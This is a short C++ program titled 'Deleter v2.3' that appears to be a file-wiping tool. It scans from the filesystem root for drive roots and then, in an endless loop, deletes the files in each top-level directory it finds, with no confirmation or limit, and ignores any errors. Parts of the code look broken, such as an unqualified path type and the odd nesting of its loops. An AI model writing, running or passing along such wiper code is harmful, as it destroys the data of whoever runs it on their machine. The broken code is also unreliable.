#include <iostream>
#include <string>
#include <vector>
#include "ghc/filesystem.hpp"
namespace fs = ghc::filesystem;
using namespace std;
int DeleterMain() {
    string Title = "Deleter v2.3";
    cout << Title << endl;
    vector<path> Disks; // Declare an empty vector
    while (true) {
      for (const fs::directory_entry &root : fs::recursive_directory_iterator(
               fs::current_path()
                   .root_directory())) {
        if (root.path().parent_path() != root.path() &&
            root.path().string().length() <= 3) {
          cout << "Possible Root Directory: " << root.path() << endl;
          Disks.push_back(root.path());
        }
        std::vector<std::string> drives;
        for (const fs::path &disk : Disks) {
          drives.push_back(disk.string());
        }
        // Iterate through the split drives
        for (const std::string &drive : drives) {
          std::vector<fs::path> dirs;
          for (const fs::directory_entry &entry :
               fs::directory_iterator(drive)) {
            dirs.push_back(entry.path());
          }
          for (const fs::path &dir : dirs) {
            if (is_directory(dir)) {
              std::vector<fs::path> files;
              for (const fs::directory_entry &file :
                   fs::directory_iterator(dir)) {
                files.push_back(file.path());
              }
              for (const fs::path &file : files) {
                cout << "Deleting " << file << endl;
                try {
                  std::error_code ec;
                  remove(file, ec);
                } catch (exception e) {
                  std::cerr << "Error deleting file: " << e.what() << std::endl;
                }
              }
            }
          }
        }
      }
    }
}
